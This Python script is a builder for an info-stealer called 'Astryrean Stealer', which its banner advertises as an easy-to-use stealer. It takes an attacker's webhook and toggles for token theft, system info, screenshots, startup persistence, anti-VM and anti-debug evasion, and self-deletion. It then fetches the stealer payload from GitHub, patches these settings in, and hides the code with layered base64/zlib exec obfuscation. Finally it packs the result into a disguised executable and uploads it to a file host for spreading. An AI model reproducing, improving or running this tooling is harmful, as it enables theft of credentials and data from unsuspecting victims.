import os
import ast
import random
import zlib
import base64
import subprocess
import colorama
from colorama import Fore
import pyfiglet
import requests

# ================================================================================================================================== #
#                                                              Astryrean Stealer                                                     #
# ================================================================================================================================== #
from pystyle import Center
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
from rich import print as rprint

# Obfuscator
class Obfuscators:
    """
    Obfuscate code using github.com/Lawxsz/Py-obfuscator | ❤ Make With Lawxsz THanks You.
    """
    def __init__(self, include_imports: bool = False, recursion: int = 1):
        self.include_imports = include_imports
        self.recursion = max(1, recursion)
        self._imports = []

    def execute(self, filepath: str):
        if not os.path.isfile(filepath):
            rprint(f"[red] [-] File Not Found!: {filepath}")
            return

        with open(filepath, "r", encoding="utf-8") as f:
            code = f.read()

        # Save the original code to decode.txt before obfuscating
        self.save_original_code(filepath, code)

        obfuscated_code = self.obfuscate(code)

        with open(filepath, "w", encoding="utf-8") as f:
            f.write(obfuscated_code)

        rprint(f"[blue][Pyobf][white] {filepath} obfuscated")

    def save_original_code(self, filepath: str, code: str):
        decode_filepath = "decode.txt"  # The file where the original code will be saved
        try:
            with open(decode_filepath, "w", encoding="utf-8") as f:
                f.write(code)
            rprint(f"[green][+] Original code saved as {decode_filepath}[/green]")
        except Exception as e:
            rprint(f"[red] [-] Failed to save original code: {e}[/red]")

    def obfuscate(self, code: str) -> str:
        code = self._strip_comments_and_docstrings(code)
        if self.include_imports:
            self._collect_imports(code)

        for _ in range(self.recursion):
            code = self._layer_base64_zlib(code)

        if self.include_imports:
            code = self._prepend_imports(code)

        return code

    def _strip_comments_and_docstrings(self, code: str) -> str:
        tree = ast.parse(code)
        for node in ast.walk(tree):
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef, ast.Module)):
                if (doc := ast.get_docstring(node)) is not None:
                    if node.body and isinstance(node.body[0], ast.Expr):
                        node.body[0] = ast.Pass()
        return ast.unparse(tree)

    def _collect_imports(self, code: str):
        tree = ast.parse(code)
        self._imports.clear()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for name in node.names:
                    self._imports.append(f"import {name.name}")
            elif isinstance(node, ast.ImportFrom):
                module = node.module or ""
                for name in node.names:
                    self._imports.append(f"from {module} import {name.name}")

    def _prepend_imports(self, code: str) -> str:
        import_code = "\n".join(self._imports)
        return import_code + "\n" + code

    def _layer_base64_zlib(self, code: str) -> str:
        compressed = zlib.compress(code.encode())
        encoded = base64.b64encode(compressed).decode()
        layer = f"""
import zlib, base64
exec(zlib.decompress(base64.b64decode("{encoded}")).decode())
"""
        return layer.strip()


# Main Program
colorama.init(autoreset=True)
os.system("cls" if os.name == "nt" else "clear")

target_file = "utils/main.py"
download_url = "https://raw.githubusercontent.com/zakocord/Astryrean/main/build/utils/main.py"
repo_url = "https://api.github.com/repos/zakocord/Astryrean"

console_rich = Console()

ascii_art = pyfiglet.figlet_format("Astryrean", font="graffiti")
colored_art = Fore.MAGENTA + ascii_art

ob = Obfuscators(include_imports=True, recursion=2)

def get_github_stats():
    try:
        response = requests.get(repo_url)
        response.raise_for_status()
        data = response.json()
        stars = data.get("stargazers_count", 0)
        forks = data.get("forks_count", 0)
        watch = data.get("watchers", 0)
        return stars, forks, watch
    except requests.RequestException as e:
        rprint(f"[red][-] GitHub stats fetch failed: {e}[/red]")
        return None, None, None, None

stars, forks, watch= get_github_stats()
stats_text = f"Star: {stars} | Fork: {forks} | Watchers: {watch}"
old_Text = "Open-Source and Easy Use Stealer"

print(Center.XCenter(colored_art))
print(Center.XCenter(Fore.MAGENTA + old_Text))
print(Center.XCenter(Fore.MAGENTA + stats_text))

class Debug:
    ANSI_COLORS = {
        "black": "\033[30m", "red": "\033[31m", "green": "\033[32m",
        "yellow": "\033[33m", "blue": "\033[34m", "magenta": "\033[35m",
        "cyan": "\033[36m", "white": "\033[37m", "bright_black": "\033[90m",
        "bright_red": "\033[91m", "bright_green": "\033[92m", "bright_yellow": "\033[93m",
        "bright_blue": "\033[94m", "bright_magenta": "\033[95m", "bright_cyan": "\033[96m",
        "bright_white": "\033[97m", "reset": "\033[0m",
    }

    def input(self, name: str, prefix: str = "?", default: str = "", color: str = "white") -> str:
        color_code = self.ANSI_COLORS.get(color.lower(), self.ANSI_COLORS["white"])
        prompt = f"{self.ANSI_COLORS['reset']}{self.ANSI_COLORS['bright_magenta']}{prefix}{self.ANSI_COLORS['reset']} {name}{self.ANSI_COLORS['reset']}{color_code} "
        value = input(prompt)
        return value if value.strip() else default

    def log(self, logs: str, color: str = "white") -> None:
        color_code = self.ANSI_COLORS.get(color, self.ANSI_COLORS["white"])
        print(f"{color_code}{logs}{self.ANSI_COLORS['reset']}")

console = Debug()

def download_file(url, destination):
    try:
        rprint(f"[yellow][!] Downloading | {target_file} |")
        response = requests.get(url, stream=True)
        response.raise_for_status()
        total_size = int(response.headers.get('content-length', 0))
        os.makedirs(os.path.dirname(destination), exist_ok=True)

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.1f}%"),
            TimeElapsedColumn(),
            console=console_rich,
        ) as progress:
            task = progress.add_task("Downloading...", total=total_size)

            with open(destination, "wb") as f:
                for data in response.iter_content(chunk_size=1024):
                    f.write(data)
                    progress.update(task, advance=len(data))

        rprint("[green][+] Successfully Downloaded Files[/green]")
    except Exception as e:
        rprint(f"[red][-] Download Failed: {e}[/red]")

def get_user_input():
    h00k = console.input("Enter Your Webhook:", prefix="!", color="bright_magenta")
    while not h00k.startswith("https://"):
        console.log("Webhook must start with https://", color="bright_yellow")
        h00k = console.input("Enter Your Webhook:", prefix="?", color="bright_magenta")

    options = {}
    for key in ["anti_vm", "anti_debug", "token", "systeminfo", "screenshot", "startup", "restart", "self_delete", "Launcher"]:
        val = console.input(f"Enable {key.replace('_', ' ').title()}? (y/n):", prefix="?", color="bright_magenta")
        options[key] = val.lower() == 'y'

    return {
        "h00k": h00k,
        **options
    }

def update_main_py(settings):
    if not os.path.exists(target_file):
        download_file(download_url, target_file)

    try:
        with open(target_file, "r", encoding="utf-8") as f:
            lines = f.readlines()

        feature_start = None
        feature_end = None
        inside_feature = False
        h00k_found = False

        for idx, line in enumerate(lines):
            if "feature = {" in line:
                feature_start = idx
                inside_feature = True
            elif inside_feature and "}" in line:
                feature_end = idx
                break

            if "h00k =" in line:
                h00k_found = True
                console.log(f"Found h00k = {line.strip()}", color="bright_cyan")

        if feature_start is not None and feature_end is not None:
            feature_block = '    feature = {\n'
            for key in ["anti_vm", "anti_debug", "token", "systeminfo", "screenshot", "startup", "restart", "self_delete", "Launcher"]:
                feature_block += f'        "{key}": {str(settings[key]).capitalize()},\n'
            feature_block += '    }\n'

            lines = lines[:feature_start] + [feature_block] + lines[feature_end+1:]

        for i, line in enumerate(lines):
            if "h00k =" in line:
                lines[i] = f'h00k = "{settings["h00k"]}"\n'
                console.log(f"Replaced h00k = {settings['h00k']}", color="bright_cyan")
                break  

        with open(target_file, "w", encoding="utf-8") as f:
            f.writelines(lines)

        rprint("[green][+] Successfully replaced main.py[/green]")
    except Exception as e:
        rprint(f"[red][-] Failed to update main.py: {e}[/red]")

def install_pyinstaller():
    console.log("[*] Installing PyInstaller...", color="bright_cyan")
    try:
        subprocess.run(["pip", "install", "pyinstaller"], check=True, text=True)
        console.log("[+] PyInstaller installed.", color="bright_green")
    except Exception as e:
        console.log(f"[+] PyInstaller install failed: {e}", color="bright_red")

def build_exe():
    console.log("[*] Starting build process...", color="bright_magenta")
    try:
        subprocess.run(["pyinstaller", "--onefile", "--clean", "--icon=icon.ico", "--version-file=version.txt", target_file], check=True)
        console.log("[+] Executable built successfully.", color="bright_green")
    except Exception as e:
        console.log(f"[+] Failed to build executable: {e}", color="bright_red")

def upload_to_gofile(file_path):
    upload_url = 'https://upload.gofile.io/uploadfile'

    with open(file_path, 'rb') as file:
        files = {'file': (file_path, file)} 

        # Progress bar for upload
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.1f}%"),
            TimeElapsedColumn(),
            console=console_rich,
        ) as progress:
            task = progress.add_task("Uploading...", total=os.path.getsize(file_path))

            response = requests.post(upload_url, files=files)
            if response.status_code == 200:
                response_data = response.json()
                file_link = response_data['data']['downloadPage']
                rprint(f"[green][+] File uploaded successfully! Download link: {file_link}[/green]")
            else:
                rprint(f"[red][-] Failed to upload file: {response.text}[/red]")



def main():
    settings = get_user_input()
    download_file(download_url, target_file)
    update_main_py(settings)
    ob.execute("utils/main.py")
    install_pyinstaller()
    build_exe()

    file_path = "dist/main.exe"
    upload_to_gofile(file_path)

if __name__ == "__main__":
    main()
